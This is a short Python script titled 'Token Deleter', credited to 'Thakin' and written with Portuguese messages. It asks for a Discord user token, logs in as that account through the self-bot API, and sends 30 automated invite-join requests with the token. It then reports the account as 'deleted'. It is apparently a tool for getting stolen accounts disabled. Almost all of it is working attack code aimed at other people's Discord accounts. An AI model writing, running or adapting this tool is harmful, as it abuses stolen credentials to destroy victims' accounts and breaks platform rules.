#Criado Por Thakin
from colorama import init
from colorama import Fore, Back, Style
init()
import sys
import discord
import asyncio
import requests
import os
import time

print(f"""{Fore.RED}
████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ██████╗ ███████╗██╗     ███████╗████████╗███████╗██████╗ 
╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔══██╗██╔════╝██║     ██╔════╝╚══██╔══╝██╔════╝██╔══██╗
   ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ██║  ██║█████╗  ██║     █████╗     ██║   █████╗  ██████╔╝
   ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ██║  ██║██╔══╝  ██║     ██╔══╝     ██║   ██╔══╝  ██╔══██╗
   ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ██████╔╝███████╗███████╗███████╗   ██║   ███████╗██║  ██║
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚═════╝ ╚══════╝╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
              {Fore.GREEN}      ───────────────────────────────────────────────────────────""")

frase ="                     Criado Por Thakin#0001 GitHub:"

import time, sys

for i in list(frase):
    print(i, end='')
    sys.stdout.flush()
    time.sleep(0.1)
 

time.sleep(0.1)
print (f'{Fore.YELLOW} https://github.com/Thakinn')
print (f'{Fore.GREEN}                    ───────────────────────────────────────────────────────────{Fore.BLUE}')
token = input ('\n TOKEN: ')
client = discord.Client()
@client.event
async def on_ready():
    print (f'{Fore.GREEN} DELETANDO...')
    for x in range(30):
        apilink = "https://discordapp.com/api/v6/invite/r3sSKJJ"
        headers={
        'Authorization': token
        }
        requests.post(apilink, headers=headers)
    print (f'{Fore.GREEN} CONTA DELETADA COM SUCESSO!')
    input()
    sys.exit()
try:
    client.run(token,bot=False)
except Exception:
    print (f'{Fore.RED} TOKEN INVÁLIDO')

input()